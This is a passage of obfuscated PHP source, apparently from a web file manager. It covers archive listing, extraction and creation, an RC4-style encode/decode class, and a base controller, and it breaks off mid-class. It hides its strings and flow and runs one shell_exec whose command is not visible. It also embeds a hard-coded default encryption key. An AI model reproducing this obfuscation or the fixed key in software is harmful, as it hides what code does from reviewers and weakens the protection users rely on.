<?php
 goto e¥¨Œƒõ¯; EÚšÃ‰ìÂ…: class KodArchive { static function init() { goto E‰àŒ†µÉÖ; B”›­„ˆ¥Ú: require_once ARCHIVE_LIB . $eŠæ×ÙŒâ[1857]; goto E‚Á°ß›Í‡; fÂÆèÑ¦ğœ: define($eŠæ×ÙŒâ[1848], TEMP_FILES); define($eŠæ×ÙŒâ[1849], TEMP_FILES); define($eŠæ×ÙŒâ[1850], $eŠæ×ÙŒâ[1851]); goto D…ÊîÄÈŸ‹; D…ÊîÄÈŸ‹: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $eŠæ×ÙŒâ[1852]; require_once ARCHIVE_LIB . $eŠæ×ÙŒâ[1853]; goto fÉ¶““ÙÁÀ; E‰àŒ†µÉÖ: $eŠæ×ÙŒâ =& $_SERVER[£ü]; if (defined($eŠæ×ÙŒâ[1846])) { return; } define($eŠæ×ÙŒâ[1846], SDK_DIR . $eŠæ×ÙŒâ[1847]); goto fÂÆèÑ¦ğœ; fÉ¶““ÙÁÀ: require_once ARCHIVE_LIB . $eŠæ×ÙŒâ[1854]; require_once ARCHIVE_LIB . $eŠæ×ÙŒâ[1855]; require_once ARCHIVE_LIB . $eŠæ×ÙŒâ[1856]; goto B”›­„ˆ¥Ú; E‚Á°ß›Í‡: } static function checkIfType($C’–ÀÔì±å, $c™Š²„¡çŞ) { goto FÙºğÚõæ; fËÂšà¹ç: return $Eó±•ß–®Í; goto D‚«„²†ÅÃ; FÙºğÚõæ: $eÚòà§Ğ–¤ =& $_SERVER[£ü]; self::init(); $fºĞÃíóè = array($eÚòà§Ğ–¤[298] => array($eÚòà§Ğ–¤[298], $eÚòà§Ğ–¤[1858], $eÚòà§Ğ–¤[1859], $eÚòà§Ğ–¤[1860]), $eÚòà§Ğ–¤[1861] => array($eÚòà§Ğ–¤[1861], $eÚòà§Ğ–¤[1862], $eÚòà§Ğ–¤[1033], $eÚòà§Ğ–¤[1031]), $eÚòà§Ğ–¤[1035] => array($eÚòà§Ğ–¤[1035], $eÚòà§Ğ–¤[1863], $eÚòà§Ğ–¤[1864], $eÚòà§Ğ–¤[1865], $eÚòà§Ğ–¤[1866], $eÚòà§Ğ–¤[1867], $eÚòà§Ğ–¤[1868])); goto Bß¤“À«ÍÒ; Bß¤“À«ÍÒ: $Eó±•ß–®Í = in_array($C’–ÀÔì±å, $fºĞÃíóè[$c™Š²„¡çŞ]); if ($Eó±•ß–®Í && ($c™Š²„¡çŞ == $eÚòà§Ğ–¤[298] || $c™Š²„¡çŞ == $eÚòà§Ğ–¤[1861]) && (!function_exists($eÚòà§Ğ–¤[1869]) || !function_exists($eÚòà§Ğ–¤[1870]))) { show_tips($eÚòà§Ğ–¤[1871]); } if ($Eó±•ß–®Í && $c™Š²„¡çŞ == $eÚòà§Ğ–¤[1035] && (!function_exists($eÚòà§Ğ–¤[1872]) || !strstr(shell_exec($eÚòà§Ğ–¤[1873]), $eÚòà§Ğ–¤[1874]))) { show_tips($eÚòà§Ğ–¤[1875]); } goto fËÂšà¹ç; D‚«„²†ÅÃ: } static function listContent($BÄ‰˜‰á», $bØ™»é¶ïí = true) { $Cö¦ĞõİêÆ =& $_SERVER[£ü]; self::init(); $eÖ‰È„ÔÌŠ = !empty($GLOBALS[$Cö¦ĞõİêÆ[1039]]) ? $GLOBALS[$Cö¦ĞõİêÆ[1039]] : get_path_ext($BÄ‰˜‰á»); $bŠ½°Ş¿õà = !1; if (self::checkIfType($eÖ‰È„ÔÌŠ, $Cö¦ĞõİêÆ[1861])) { $Cù±“ùíÜ = PclTarList($BÄ‰˜‰á», $eÖ‰È„ÔÌŠ); $bŠ½°Ş¿õà = array(); for ($aÓÑ†„Ê²â = 0; $aÓÑ†„Ê²â < count($Cù±“ùíÜ); $aÓÑ†„Ê²â++) { $D³åÏ’ö÷ = $Cù±“ùíÜ[$aÓÑ†„Ê²â]; if ($D³åÏ’ö÷[$Cö¦ĞõİêÆ[1876]] == $Cö¦ĞõİêÆ[1877] || $D³åÏ’ö÷[$Cö¦ĞõİêÆ[1876]] == $Cö¦ĞõİêÆ[1878]) { continue; } if ($bØ™»é¶ïí) { $D³åÏ’ö÷[$Cö¦ĞõİêÆ[1879]] = ltrim($D³åÏ’ö÷[$Cö¦ĞõİêÆ[1879]], $Cö¦ĞõİêÆ[1137]); } if ($D³åÏ’ö÷[$Cö¦ĞõİêÆ[1876]] == $Cö¦ĞõİêÆ[1880]) { $D³åÏ’ö÷[$Cö¦ĞõİêÆ[76]] = !0; } else { $D³åÏ’ö÷[$Cö¦ĞõİêÆ[76]] = !1; } $D³åÏ’ö÷[$Cö¦ĞõİêÆ[1026]] = $aÓÑ†„Ê²â; $bŠ½°Ş¿õà[] = $D³åÏ’ö÷; } } else { if (self::checkIfType($eÖ‰È„ÔÌŠ, $Cö¦ĞõİêÆ[1035])) { $c¶Šåƒ£µ¢ = kodRarArchive::listContent($BÄ‰˜‰á»); if (!$c¶Šåƒ£µ¢[$Cö¦ĞõİêÆ[1022]]) { return $c¶Šåƒ£µ¢; } else { $bŠ½°Ş¿õà = $c¶Šåƒ£µ¢[$Cö¦ĞõİêÆ[1024]]; } } else { if (kodZipArchive::support($Cö¦ĞõİêÆ[351])) { $bŠ½°Ş¿õà = kodZipArchive::listContent($BÄ‰˜‰á»); } else { $CñÆ„Š§„ = new PclZip($BÄ‰˜‰á»); $bŠ½°Ş¿õà = $CñÆ„Š§„->listContent(); } } } if ($bŠ½°Ş¿õà) { $ağŞ¿šò„Ø = unzip_charset_get($bŠ½°Ş¿õà); $bØ™»é¶ïí = $bØ™»é¶ïí && function_exists($Cö¦ĞõİêÆ[65]); for ($aÓÑ†„Ê²â = 0; $aÓÑ†„Ê²â < count($bŠ½°Ş¿õà); $aÓÑ†„Ê²â++) { $bŠ½°Ş¿õà[$aÓÑ†„Ê²â][$Cö¦ĞõİêÆ[1879]] = str_replace(array($Cö¦ĞõİêÆ[1062], $Cö¦ĞõİêÆ[1881]), $Cö¦ĞõİêÆ[758], $bŠ½°Ş¿õà[$aÓÑ†„Ê²â][$Cö¦ĞõİêÆ[1879]]); if ($bØ™»é¶ïí) { $bŠ½°Ş¿õà[$aÓÑ†„Ê²â][$Cö¦ĞõİêÆ[1879]] = iconv_to($bŠ½°Ş¿õà[$aÓÑ†„Ê²â][$Cö¦ĞõİêÆ[1879]], $ağŞ¿šò„Ø, $Cö¦ĞõİêÆ[323]); unset($bŠ½°Ş¿õà[$aÓÑ†„Ê²â][$Cö¦ĞõİêÆ[1882]]); } } return array($Cö¦ĞõİêÆ[1022] => !0, $Cö¦ĞõİêÆ[1024] => $bŠ½°Ş¿õà); } else { return array($Cö¦ĞõİêÆ[1022] => !1, $Cö¦ĞõİêÆ[1024] => $bŠ½°Ş¿õà); } } static function extract($C¨×çäˆŠ, $dº˜Ã±ë­¾, $EŸ—†‚§Û = "\x2d\61", &$b¸“ƒ˜Æ¶ = false) { goto A‰Şê¼§äâ; eÒ ¤ñ‡ºÇ: if (self::checkIfType($fï«š‰†Öä, $b…ÖÄÈ®ìÏ[1861])) { if ($EŸ—†‚§Û != $b…ÖÄÈ®ìÏ[1021]) { $C¢‰©ìëÖ‹ = unzip_pre_name($C¢‰©ìëÖ‹); $cšÓÊ†‘ = unzip_pre_name($cšÓÊ†‘); $DÑÄ¾ÒàŒ = PclTarExtractList($C¨×çäˆŠ, array($C¢‰©ìëÖ‹), $dº˜Ã±ë­¾, $cšÓÊ†‘, $fï«š‰†Öä); } else { $DÑÄ¾ÒàŒ = PclTarExtract($C¨×çäˆŠ, $dº˜Ã±ë­¾, $b…ÖÄÈ®ìÏ[358], $fï«š‰†Öä); } return array($b…ÖÄÈ®ìÏ[1022] => $DÑÄ¾ÒàŒ, $b…ÖÄÈ®ìÏ[1024] => PclErrorString(!0)); } else { if (self::checkIfType($fï«š‰†Öä, $b…ÖÄÈ®ìÏ[1035])) { return kodRarArchive::extract($C¨×çäˆŠ, $dº˜Ã±ë­¾, $fï«š‰†Öä, $b¸“ƒ˜Æ¶); } else { if (kodZipArchive::support($b…ÖÄÈ®ìÏ[1883])) { return kodZipArchive::extract($C¨×çäˆŠ, $dº˜Ã±ë­¾, $b¸“ƒ˜Æ¶); } else { $f²ùÜùğÏ› = new PclZip($C¨×çäˆŠ); if ($EŸ—†‚§Û != $b…ÖÄÈ®ìÏ[1021]) { $DÑÄ¾ÒàŒ = $f²ùÜùğÏ›->extract(PCLZIP_OPT_PATH, $dº˜Ã±ë­¾, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $b…ÖÄÈ®ìÏ[1884], PCLZIP_OPT_BY_NAME, $F³Š¨Œ‘½[$b…ÖÄÈ®ìÏ[1879]], PCLZIP_OPT_REMOVE_PATH, $cšÓÊ†‘, PCLZIP_OPT_REPLACE_NEWER); } else { $DÑÄ¾ÒàŒ = $f²ùÜùğÏ›->extract(PCLZIP_OPT_PATH, $dº˜Ã±ë­¾, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $b…ÖÄÈ®ìÏ[1884], PCLZIP_OPT_REPLACE_NEWER); } return array($b…ÖÄÈ®ìÏ[1022] => $DÑÄ¾ÒàŒ, $b…ÖÄÈ®ìÏ[1024] => $f²ùÜùğÏ›->errorName(!0)); } } } return array($b…ÖÄÈ®ìÏ[1022] => !1, $b…ÖÄÈ®ìÏ[1024] => $b…ÖÄÈ®ìÏ[1885]); goto Bªğíî˜Õš; A‰Şê¼§äâ: $b…ÖÄÈ®ìÏ =& $_SERVER[£ü]; self::init(); $fï«š‰†Öä = !empty($GLOBALS[$b…ÖÄÈ®ìÏ[1039]]) ? $GLOBALS[$b…ÖÄÈ®ìÏ[1039]] : get_path_ext($C¨×çäˆŠ); goto d­ˆáÒ¥Ä‚; d­ˆáÒ¥Ä‚: $C˜ÇÏã”‰ = self::listContent($C¨×çäˆŠ, !1); if (!$C˜ÇÏã”‰[$b…ÖÄÈ®ìÏ[1022]]) { return $C˜ÇÏã”‰; } if ($EŸ—†‚§Û != $b…ÖÄÈ®ìÏ[1021]) { goto D¾íŒ¢Ÿ¤; dÍõÎ½ÅÅ‘: if ($GLOBALS[$b…ÖÄÈ®ìÏ[6]][$b…ÖÄÈ®ìÏ[1135]] != $b…ÖÄÈ®ìÏ[323]) { $C¢‰©ìëÖ‹ = unzip_pre_name($b¸“ƒ˜Æ¶); } $cšÓÊ†‘ = get_path_father($b¸“ƒ˜Æ¶); if ($cšÓÊ†‘ == $b¸“ƒ˜Æ¶) { $cšÓÊ†‘ = $b…ÖÄÈ®ìÏ[33]; } goto Dƒ˜Œ”‹†; D¾íŒ¢Ÿ¤: $F³Š¨Œ‘½ = self::fileIndex($C˜ÇÏã”‰[$b…ÖÄÈ®ìÏ[1024]], $EŸ—†‚§Û); $b¸“ƒ˜Æ¶ = str_replace(array($b…ÖÄÈ®ìÏ[1062], $b…ÖÄÈ®ìÏ[1881]), $b…ÖÄÈ®ìÏ[70], $F³Š¨Œ‘½[$b…ÖÄÈ®ìÏ[1879]]); $C¢‰©ìëÖ‹ = $b¸“ƒ˜Æ¶; goto dÍõÎ½ÅÅ‘; Dƒ˜Œ”‹†: if ($F³Š¨Œ‘½[$b…ÖÄÈ®ìÏ[76]]) { $C¢‰©ìëÖ‹ = rtrim($C¢‰©ìëÖ‹, $b…ÖÄÈ®ìÏ[8]) . $b…ÖÄÈ®ìÏ[8]; $b¸“ƒ˜Æ¶ = array($b¸“ƒ˜Æ¶); } $a²µƒˆ†ó = str_replace($b…ÖÄÈ®ìÏ[95], $b…ÖÄÈ®ìÏ[8], $C¢‰©ìëÖ‹); if (substr($a²µƒˆ†ó, -1) == $b…ÖÄÈ®ìÏ[8]) { if (!strstr(trim($a²µƒˆ†ó, $b…ÖÄÈ®ìÏ[8]), $b…ÖÄÈ®ìÏ[8])) { $dº˜Ã±ë­¾ = $dº˜Ã±ë­¾ . get_path_this($a²µƒˆ†ó) . $b…ÖÄÈ®ìÏ[8]; } } else { if ($cšÓÊ†‘ == $C¢‰©ìëÖ‹) { $cšÓÊ†‘ = $b…ÖÄÈ®ìÏ[33]; } } goto f ¯¿ç–§À; f ¯¿ç–§À: } goto eÒ ¤ñ‡ºÇ; Bªğíî˜Õš: } static function fileIndex($D·ÏâØµæ, $cËİ„ç…Š, $AŠõÕì˜ÏŞ = false) { goto b‹•™ƒ†Ş; eÁ–ÄŠšÙê: $d®Ù¢ˆ¦¥‡ = count($D·ÏâØµæ); for ($AÚíØµœî = 0; $AÚíØµœî < $d®Ù¢ˆ¦¥‡; $AÚíØµœî++) { if ($cËİ„ç…Š == $D·ÏâØµæ[$AÚíØµœî][$dŠÕ÷ïŠÜ[1026]]) { $AñÅ¥šâö´ = $D·ÏâØµæ[$AÚíØµœî]; break; } } if (!$AñÅ¥šâö´) { show_tips($dŠÕ÷ïŠÜ[1886]); } goto E´øâÏ˜ÄÏ; E´øâÏ˜ÄÏ: $BÎé¬Œ‘ÆÅ = $AñÅ¥šâö´; if ($AŠõÕì˜ÏŞ) { $BÎé¬Œ‘ÆÅ = $AñÅ¥šâö´[$AŠõÕì˜ÏŞ]; if ($AñÅ¥šâö´[$dŠÕ÷ïŠÜ[76]]) { $BÎé¬Œ‘ÆÅ = rtrim($BÎé¬Œ‘ÆÅ, $dŠÕ÷ïŠÜ[8]) . $dŠÕ÷ïŠÜ[8]; } } return $BÎé¬Œ‘ÆÅ; goto Dã¢¹ÍÆ™…; b‹•™ƒ†Ş: $dŠÕ÷ïŠÜ =& $_SERVER[£ü]; self::init(); if (!is_array($D·ÏâØµæ)) { return !1; } goto eÁ–ÄŠšÙê; Dã¢¹ÍÆ™…: } static function extractZipFile($D“”áÄš×È, $BŠÈ“ëÜ–É, $d˜çÍõµ±£ = false) { goto c½¢Œâ‹…; fƒöêƒÕŒ: $F–£ãğÕ  = get_path_father($BŠÈ“ëÜ–É); if ($F–£ãğÕ  == $BŠÈ“ëÜ–É) { $F–£ãğÕ  = $Aæ†Ó†ê§[33]; } $AğôÉˆºä³ = $D›éßòÌÒš->extract(PCLZIP_OPT_PATH, $C¯áœÁÑò, PCLZIP_CB_PRE_FILE_NAME, $Aæ†Ó†ê§[1884], PCLZIP_OPT_REMOVE_PATH, $F–£ãğÕ , PCLZIP_OPT_BY_NAME, $BŠÈ“ëÜ–É); goto dš“’™É—Ş; eÓ»ëĞ‘«­: mk_dir($C¯áœÁÑò); $EÄ„•ÑÍ¼ = $C¯áœÁÑò . md5($D“”áÄš×È . $BŠÈ“ëÜ–É); if ($d˜çÍõµ±£) { $EÄ„•ÑÍ¼ = $C¯áœÁÑò . $d˜çÍõµ±£; } goto EÔ…„°çÉÚ; dš“’™É—Ş: if (!file_exists($Fëáºäé¿Í)) { return !1; } @rename($Fëáºäé¿Í, $EÄ„•ÑÍ¼); return $EÄ„•ÑÍ¼; goto e´Éá‹ŒÑ; c½¢Œâ‹…: $Aæ†Ó†ê§ =& $_SERVER[£ü]; self::init(); $C¯áœÁÑò = TEMP_FILES . hash_path($D“”áÄš×È) . $Aæ†Ó†ê§[8]; goto eÓ»ëĞ‘«­; EÔ…„°çÉÚ: if (file_exists($EÄ„•ÑÍ¼)) { return $EÄ„•ÑÍ¼; } $D›éßòÌÒš = new PclZip($D“”áÄš×È); $Fëáºäé¿Í = unzip_filter_ext($C¯áœÁÑò . get_path_this($BŠÈ“ëÜ–É)); goto fƒöêƒÕŒ; e´Éá‹ŒÑ: } static function filePreview($fÍÜ…‡¹Ë, $bæÄ‘˜½², $eôÕ°ÅŒÑä = false, $C¦š×°ù¢ = false) { goto A’²÷ßÚó; eÄÂ®ö«ÆŒ: if (!file_exists($dÀùÜ³›é”)) { del_dir($eíœñŠãî„); show_json($BÔ½ù®°Ã“[1889]); } IO::fileOut($dÀùÜ³›é”, $eôÕ°ÅŒÑä, $DõË½–Ùø); goto aéŒ•¸œÚ²; fª±ÚŠÕö¯: $FòëÍÉ¸¤Ó = unzip_pre_name($FòëÍÉ¸¤Ó); $DõË½–Ùø = get_path_this($FòëÍÉ¸¤Ó); $B¡Â‡ÉÁÜÙ = unzip_filter_ext($eíœñŠãî„ . $DõË½–Ùø); goto C¸Ÿéà¥; A’²÷ßÚó: $BÔ½ù®°Ã“ =& $_SERVER[£ü]; self::init(); $eíœñŠãî„ = TEMP_FILES . hash_path($fÍÜ…‡¹Ë) . $BÔ½ù®°Ã“[8]; goto EÃã‚öóİÈ; C¸Ÿéà¥: if (!$bÔÍ’›œÙ¨[$BÔ½ù®°Ã“[1022]]) { show_json($bÔÍ’›œÙ¨[$BÔ½ù®°Ã“[1024]], !1); } if (!file_exists($B¡Â‡ÉÁÜÙ)) { show_json($BÔ½ù®°Ã“[1888], !1); } @rename($B¡Â‡ÉÁÜÙ, $dÀùÜ³›é”); goto eÄÂ®ö«ÆŒ; EÃã‚öóİÈ: mk_dir($eíœñŠãî„); $dÀùÜ³›é” = $eíœñŠãî„ . md5($fÍÜ…‡¹Ë . $bæÄ‘˜½² . $C¦š×°ù¢); $FòëÍÉ¸¤Ó = $BÔ½ù®°Ã“[33]; goto C¬»›ŒÛó¯; C¬»›ŒÛó¯: $bÔÍ’›œÙ¨ = self::extract($fÍÜ…‡¹Ë, $eíœñŠãî„, $bæÄ‘˜½², $FòëÍÉ¸¤Ó); if (is_array($FòëÍÉ¸¤Ó)) { show_json($BÔ½ù®°Ã“[1887], !1); } if (file_exists($dÀùÜ³›é”)) { IO::fileOut($dÀùÜ³›é”, $eôÕ°ÅŒÑä, get_path_this($FòëÍÉ¸¤Ó)); return; } goto fª±ÚŠÕö¯; aéŒ•¸œÚ²: } static function create($e©Š‰İÍå, $AĞÙ¼›¼¼ğ) { $cê¤É‚ìí° =& $_SERVER[£ü]; self::init(); $F‡©íŸ¨©” = get_path_ext($e©Š‰İÍå); $A¨÷ÎŠâ = !1; if (self::checkIfType($F‡©íŸ¨©”, $cê¤É‚ìí°[298])) { if (kodZipArchive::support($cê¤É‚ìí°[998])) { return kodZipArchive::create($e©Š‰İÍå, $AĞÙ¼›¼¼ğ); } $eŸ¶£½‰Ò = new PclZip($e©Š‰İÍå); foreach ($AĞÙ¼›¼¼ğ as $dÒ—»˜íä => $c«ö‹Š‘Ş) { $c«ö‹Š‘Ş = str_replace($cê¤É‚ìí°[463], $cê¤É‚ìí°[8], $c«ö‹Š‘Ş); $eˆßÑŒªñÃ = Kodio::clear(get_path_father($c«ö‹Š‘Ş)); if ($dÒ—»˜íä == 0) { $A¨÷ÎŠâ = $eŸ¶£½‰Ò->create($c«ö‹Š‘Ş, PCLZIP_OPT_REMOVE_PATH, $eˆßÑŒªñÃ, PCLZIP_CB_PRE_FILE_NAME, $cê¤É‚ìí°[1890]); continue; } $A¨÷ÎŠâ = $eŸ¶£½‰Ò->add($c«ö‹Š‘Ş, PCLZIP_OPT_REMOVE_PATH, $eˆßÑŒªñÃ, PCLZIP_CB_PRE_FILE_NAME, $cê¤É‚ìí°[1890]); } } else { if (self::checkIfType($F‡©íŸ¨©”, $cê¤É‚ìí°[1861])) { foreach ($AĞÙ¼›¼¼ğ as $dÒ—»˜íä => $c«ö‹Š‘Ş) { $c«ö‹Š‘Ş = str_replace($cê¤É‚ìí°[463], $cê¤É‚ìí°[8], $c«ö‹Š‘Ş); $eˆßÑŒªñÃ = Kodio::clear(get_path_father($c«ö‹Š‘Ş)); if ($dÒ—»˜íä == 0) { $A¨÷ÎŠâ = PclTarCreate($e©Š‰İÍå, array($c«ö‹Š‘Ş), $F‡©íŸ¨©”, null, $eˆßÑŒªñÃ); continue; } $A¨÷ÎŠâ = PclTarAddList($e©Š‰İÍå, array($c«ö‹Š‘Ş), $cê¤É‚ìí°[33], $eˆßÑŒªñÃ, $F‡©íŸ¨©”); } } } return $A¨÷ÎŠâ; } } class Mcrypt { public static $defaultKey = "\x61\41\164\141\153\101\72\144\x6c\155\143\154\x64\105\166\54\x65"; public static function encode($A–·‚Ç›ÖÒ, $Cˆ–ç¸Ğ“™ = '', $EÒàİÍ…é  = 0, $BîôÏÂ—«­ = '') { goto CŒ¾±ø®„Ÿ; f•Çäƒ Í: $BŸ±¥À†ë = str_replace(array($b´¥¾İ‰÷Š[281], $b´¥¾İ‰÷Š[8], $b´¥¾İ‰÷Š[897]), array($b´¥¾İ‰÷Š[408], $b´¥¾İ‰÷Š[70], $b´¥¾İ‰÷Š[93]), $BŸ±¥À†ë); return $BŸ±¥À†ë; goto A“É´Œèˆò; C«Ô»ÜŠĞÓ: $bØŞÔˆµ†§ = substr($BîôÏÂ—«­, -$d´±ÙÔ²¨ñ); $BŠâ¾‡¤©ê = $c¬»‚Š«šã . md5($c¬»‚Š«šã . $bØŞÔˆµ†§); $FÊùæØ¯¸ˆ = strlen($BŠâ¾‡¤©ê); goto b„¾—ƒõÍ; CŒ¾±ø®„Ÿ: $b´¥¾İ‰÷Š =& $_SERVER[£ü]; $d´±ÙÔ²¨ñ = 4; $Cˆ–ç¸Ğ“™ = md5($Cˆ–ç¸Ğ“™ ? $Cˆ–ç¸Ğ“™ : self::$defaultKey); goto CÄÅ´êÁÇğ; CÄÅ´êÁÇğ: $c¬»‚Š«šã = md5(substr($Cˆ–ç¸Ğ“™, 0, 16)); $fÁò‘˜†‰Ÿ = md5(substr($Cˆ–ç¸Ğ“™, 16, 16)); $BîôÏÂ—«­ = $BîôÏÂ—«­ ? $BîôÏÂ—«­ : md5(microtime()); goto C«Ô»ÜŠĞÓ; fŸ°çêóçÇ: for ($c„ÅêÚğ’ = 0; $c„ÅêÚğ’ <= 255; $c„ÅêÚğ’++) { $B©”Ş°ÄÀ[$c„ÅêÚğ’] = ord($BŠâ¾‡¤©ê[$c„ÅêÚğ’ % $FÊùæØ¯¸ˆ]); } $BĞá—”æå = range(0, 255); for ($FøİÆÒõê = $c„ÅêÚğ’ = 0; $c„ÅêÚğ’ < 256; $c„ÅêÚğ’++) { $FøİÆÒõê = ($FøİÆÒõê + $BĞá—”æå[$c„ÅêÚğ’] + $B©”Ş°ÄÀ[$c„ÅêÚğ’]) % 256; $EÖœ†ª´¿ = $BĞá—”æå[$c„ÅêÚğ’]; $BĞá—”æå[$c„ÅêÚğ’] = $BĞá—”æå[$FøİÆÒõê]; $BĞá—”æå[$FøİÆÒõê] = $EÖœ†ª´¿; } goto EÙçğÛ¨ßÉ; b„¾—ƒõÍ: $A–·‚Ç›ÖÒ = sprintf($b´¥¾İ‰÷Š[1891], $EÒàİÍ…é  ? $EÒàİÍ…é  + time() : 0) . substr(md5($A–·‚Ç›ÖÒ . $fÁò‘˜†‰Ÿ), 0, 16) . $A–·‚Ç›ÖÒ; $b¾ÂÙêÕ„Û = strlen($A–·‚Ç›ÖÒ); $B©”Ş°ÄÀ = array(); goto fŸ°çêóçÇ; EÙçğÛ¨ßÉ: $BŸ±¥À†ë = $b´¥¾İ‰÷Š[33]; for ($c• „Ã¯« = $FøİÆÒõê = $c„ÅêÚğ’ = 0; $c„ÅêÚğ’ < $b¾ÂÙêÕ„Û; $c„ÅêÚğ’++) { $c• „Ã¯« = ($c• „Ã¯« + 1) % 256; $FøİÆÒõê = ($FøİÆÒõê + $BĞá—”æå[$c• „Ã¯«]) % 256; $EÖœ†ª´¿ = $BĞá—”æå[$c• „Ã¯«]; $BĞá—”æå[$c• „Ã¯«] = $BĞá—”æå[$FøİÆÒõê]; $BĞá—”æå[$FøİÆÒõê] = $EÖœ†ª´¿; $BŸ±¥À†ë .= chr(ord($A–·‚Ç›ÖÒ[$c„ÅêÚğ’]) ^ $BĞá—”æå[($BĞá—”æå[$c• „Ã¯«] + $BĞá—”æå[$FøİÆÒõê]) % 256]); } $BŸ±¥À†ë = $bØŞÔˆµ†§ . str_replace($b´¥¾İ‰÷Š[897], $b´¥¾İ‰÷Š[33], base64_encode($BŸ±¥À†ë)); goto f•Çäƒ Í; A“É´Œèˆò: } public static function decode($EŞš²ƒœİ±, $F›±ã£ÓÉ¶ = '') { goto FÂÖÃ–¡Õ¸; c‘ÎÊ¾íÈ‘: $F›±ã£ÓÉ¶ = md5($F›±ã£ÓÉ¶ ? $F›±ã£ÓÉ¶ : self::$defaultKey); $Cğ¯ï¶Àƒ„ = md5(substr($F›±ã£ÓÉ¶, 0, 16)); $bê¤î©¢“Ş = md5(substr($F›±ã£ÓÉ¶, 16, 16)); goto BÒ¿Ô…â¤; cŒœ½À«î: if (($a¨¿Ó­· µ == 0 || $a¨¿Ó­· µ - time() > 0) && substr($c©éĞºÛø, 10, 16) == substr(md5(substr($c©éĞºÛø, 26) . $bê¤î©¢“Ş), 0, 16)) { return substr($c©éĞºÛø, 26); } else { return $a›â…´ÑÃ[33]; } goto DŸ¸Ç›¦ôÂ; F’Ÿ›¾É: for ($D«ñÛòÁ– = 0; $D«ñÛòÁ– <= 255; $D«ñÛòÁ–++) { $a¿ñì‘ã[$D«ñÛòÁ–] = ord($D†Ü…î‡Â·[$D«ñÛòÁ– % $Bãèá¼ì]); } $Bè„ôÆÜÀ‰ = range(0, 255); for ($Eææ ÒŸó­ = $D«ñÛòÁ– = 0; $D«ñÛòÁ– < 256; $D«ñÛòÁ–++) { $Eææ ÒŸó­ = ($Eææ ÒŸó­ + $Bè„ôÆÜÀ‰[$D«ñÛòÁ–] + $a¿ñì‘ã[$D«ñÛòÁ–]) % 256; $dù¶Éºà× = $Bè„ôÆÜÀ‰[$D«ñÛòÁ–]; $Bè„ôÆÜÀ‰[$D«ñÛòÁ–] = $Bè„ôÆÜÀ‰[$Eææ ÒŸó­]; $Bè„ôÆÜÀ‰[$Eææ ÒŸó­] = $dù¶Éºà×; } goto f¹™Ú¥Ò; FÂÖÃ–¡Õ¸: $a›â…´ÑÃ =& $_SERVER[£ü]; $EŞš²ƒœİ± = str_replace(array($a›â…´ÑÃ[408], $a›â…´ÑÃ[70], $a›â…´ÑÃ[93]), array($a›â…´ÑÃ[281], $a›â…´ÑÃ[8], $a›â…´ÑÃ[897]), $EŞš²ƒœİ±); $EóˆĞ»Ã»É = 4; goto c‘ÎÊ¾íÈ‘; f¹™Ú¥Ò: $c©éĞºÛø = $a›â…´ÑÃ[33]; for ($AÇŞ¤¦Å³ä = $Eææ ÒŸó­ = $D«ñÛòÁ– = 0; $D«ñÛòÁ– < $C‘ÖßØÊõ¹; $D«ñÛòÁ–++) { $AÇŞ¤¦Å³ä = ($AÇŞ¤¦Å³ä + 1) % 256; $Eææ ÒŸó­ = ($Eææ ÒŸó­ + $Bè„ôÆÜÀ‰[$AÇŞ¤¦Å³ä]) % 256; $dù¶Éºà× = $Bè„ôÆÜÀ‰[$AÇŞ¤¦Å³ä]; $Bè„ôÆÜÀ‰[$AÇŞ¤¦Å³ä] = $Bè„ôÆÜÀ‰[$Eææ ÒŸó­]; $Bè„ôÆÜÀ‰[$Eææ ÒŸó­] = $dù¶Éºà×; $c©éĞºÛø .= chr(ord($EŞš²ƒœİ±[$D«ñÛòÁ–]) ^ $Bè„ôÆÜÀ‰[($Bè„ôÆÜÀ‰[$AÇŞ¤¦Å³ä] + $Bè„ôÆÜÀ‰[$Eææ ÒŸó­]) % 256]); } $a¨¿Ó­· µ = intval(substr($c©éĞºÛø, 0, 10)); goto cŒœ½À«î; BÒ¿Ô…â¤: $bí»»§Ì = substr($EŞš²ƒœİ±, 0, $EóˆĞ»Ã»É); $D†Ü…î‡Â· = $Cğ¯ï¶Àƒ„ . md5($Cğ¯ï¶Àƒ„ . $bí»»§Ì); $Bãèá¼ì = strlen($D†Ü…î‡Â·); goto D…áÌäİğø; D…áÌäİğø: $EŞš²ƒœİ± = base64_decode(substr($EŞš²ƒœİ±, $EóˆĞ»Ã»É)); $C‘ÖßØÊõ¹ = strlen($EŞš²ƒœİ±); $a¿ñì‘ã = array(); goto F’Ÿ›¾É; DŸ¸Ç›¦ôÂ: } } define($_SERVER[£ü][1892], 1); goto BÔÂ§Â©ß¦; cµÃ²Û”Ø°: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e™ğÑ«—š±; b¢’é‘Á§Ã: $this->tpl = TEMPLATE . MOD . $DÔ‰Éù[8]; $this->_classObjectID = mt_rand(0, 10000); goto bÀ«Ì¦; Bëóªªƒ‹ß: $this->in =& $in; $this->values[$DÔ‰Éù[6]] =& $config; $this->values[$DÔ‰Éù[7]] =& $in; goto b¢’é‘Á§Ã; e™ğÑ«—š±: $DÔ‰Éù =& $_SERVER[£ü]; global $in, $config; $this->config =& $config; goto Bëóªªƒ‹ß; bÀ«Ì¦: } public function loadClass($cµÒÎ“¶åÌ) { if (1 === func_num_args()) { $this->{$cµÒÎ“¶åÌ} = new $cµÒÎ“¶åÌ(); } else { $E…È’ÄÜ¦ç = new ReflectionClass($cµÒÎ“¶åÌ); $a¥Œ°³ª = func_get_args(); array_shift($a¥Œ°³ª); $this->{$cµÒÎ“¶åÌ} = $E…È’ÄÜ¦ç->newInstanceArgs($a¥Œ°³ª); } return $this->{$cµÒÎ“¶åÌ}; } protected function assign($aåæùˆ¶ê‰, $AÔ´Œˆâƒ²) { $this->values[$aåæùˆ¶ê‰] = $AÔ´Œˆâƒ²; } protected function display($AîÄ¥¡£œ©) { ob_end_clean(); extract($this->values); require $this->tpl . $AîÄ¥¡£œ©; } } class DbSqliteBase extends Db { public function __construct($f…Ğè¬ö’  = '') { $e£À‡Ö¸‡· =& $_SERVER[£ü]; if (!extension_loaded($e£À‡Ö¸‡·[9])) { think_exception(think_lang($e£À‡Ö¸‡·[10]) . $e£À‡Ö¸‡·[11]); } if (!empty($f…Ğè¬ö’ )) { if (!isset($f…Ğè¬ö’ 